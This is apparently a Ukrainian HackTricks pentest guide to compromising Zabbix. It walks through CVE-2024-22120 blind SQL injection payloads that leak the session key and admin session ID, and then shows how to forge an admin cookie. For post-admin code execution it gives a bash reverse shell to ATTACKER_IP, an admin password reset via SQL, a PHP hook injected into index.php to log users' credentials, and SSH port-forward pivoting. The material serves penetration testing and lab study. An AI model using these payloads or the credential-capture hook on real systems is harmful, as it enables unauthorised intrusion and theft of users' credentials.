# Zabbix Безпека

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Zabbix — платформа моніторингу з веб-інтерфейсом (зазвичай за Apache/Nginx) та серверним компонентом, який також спілкується по Zabbix протоколу на TCP/10051 (server/trapper) і агентом на TCP/10050. Під час перевірок ви можете зустріти:

- Web UI: HTTP(S) virtual host як zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Корисний формат cookie: zbx_session — це Base64 компактного JSON-об'єкта, що містить принаймні sessionid, serverCheckResult, serverCheckTime і sign. sign — це HMAC від JSON-пейлоаду.

## zbx_session cookie: внутрішня структура

Новіші версії Zabbix обчислюють cookie так:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256 (key=session_key, data=рядок JSON з даних, відсортований за ключами та з компактними роздільниками)
- Final cookie: Base64(JSON_with_sign)

Якщо ви зможете відновити глобальний session_key і дійсний admin sessionid, ви зможете згенерувати валідний Admin cookie офлайн і автентифікуватися в UI.

## CVE-2024-22120 — Time-based blind SQLi у журналі аудиту Zabbix Server

Зачеплені версії (як публічно задокументовано):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Коротко про вразливість:

- Коли виконання Script записується в Zabbix Server audit log, поле clientip не санітується і конкатенується в SQL, що дозволяє виконати time-based blind SQLi через серверний компонент.
- Це експлуатується шляхом відправки спеціально сформованого запиту "command" на порт Zabbix server 10051 з дійсним низькоправовим sessionid, hostid, до якого користувач має доступ, та дозволеним scriptid.

Передумови та поради для виявлення:

- sessionid: Отримати з guest/login у web UI — декодуйте zbx_session (Base64), щоб дістати sessionid.
- hostid: Спостерігайте через запити web UI (наприклад, Monitoring → Hosts) або перехопіть через proxy; поширений дефолт — 10084.
- scriptid: Виконаються лише скрипти, дозволені для поточної ролі; перевірте, переглянувши меню скриптів/AJAX-відповіді. Значення за замовчуванням як 1 чи 2 часто дозволені; 3 може бути заборонено.

### Послідовність експлуатації

1) Виклик вставки в аудит з SQLi у clientip

- Підключіться до TCP/10051 і відправте Zabbix framed message з request="command", що містить sid, hostid, scriptid, і clientip встановленим у SQL-вираз, який сервер конкатенуватиме і виконуватиме.

Мінімальні поля повідомлення (JSON body):
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Повний wire-формат: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Можна використати pwntools або власний socket-код, щоб сформувати його.

2) Time-bruteforce secrets via conditional sleep

Використовуйте умовні вирази, щоб leak секрети, закодовані в hex, по одному символу, вимірюючи час відповіді. Приклади, що працювали на практиці:

- Leak глобальний session_key з config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Admin session_id (userid=1) з sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Примітки:

- charset: 32 шістнадцяткові символи [0-9a-f]
- Виберіть T_TRUE >> T_FALSE (наприклад, 10 vs 1) і вимірюйте wall-clock на спробу
- Переконайтеся, що ваш scriptid дійсно авторизований для користувача; інакше не буде створено рядка аудиту і вимірювання часу не працюватиме

3) Підробити Admin cookie

Після того як у вас є:

- session_key: 32-hex з config.session_key
- admin_sessionid: 32-hex з sessions.sessionid для userid=1

Обчислити:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Встановіть cookie zbx_session на це значення і зробіть GET /zabbix.php?action=dashboard.view, щоб підтвердити доступ Admin.

### Готові інструменти

- Public PoC автоматизує: брутфорс session_key та admin sessionid, і підробку cookie; потребує pwntools та requests.
- Зазвичай потрібно вказати параметри: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, і опційно відомий --admin-sid щоб пропустити брутфорс.

## RCE через виконання Script (після Admin)

Маючи доступ Admin в UI, ви можете запускати попередньо налаштовані Scripts проти monitored hosts. Якщо agents/hosts виконують script-команди локально, це призводить до виконання коду на цих системах (часто від імені zabbix user на Linux hosts):

- Quick check: run id to confirm user context
- Reverse shell example:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
Покращення TTY (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
Якщо у вас є доступ до DB, альтернативою підробці cookie є скидання пароля Admin на задокументований bcrypt для "zabbix":
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

Якщо file write можливий на web UI server, ви можете тимчасово додати logging snippet у /usr/share/zabbix/index.php навколо гілки form-based login, щоб capture credentials:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Користувачі автентифікуються як зазвичай; прочитайте /dev/shm/creds.txt після цього. Видаліть hook після завершення.

## Pivoting to internal services

Навіть якщо shell облікового запису сервісу — /usr/sbin/nologin, додавання запису SSH authorized_keys і використання -N -L дозволяє локальний порт-форвардинг до сервісів, доступних тільки на loopback (наприклад, CI/CD на 8111):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Дивіться більше tunneling patterns у: перевірте [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Операційні поради

- Переконайтеся, що scriptid дозволений для поточної ролі (у guest може бути обмежений набір)
- Timing brute може бути повільним; збережіть у кеші відновлений admin sessionid і використовуйте його повторно
- JSON, відправлений на 10051, має бути обгорнутий заголовком ZBXD\x01 та довжиною у little-endian

## Посилання

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
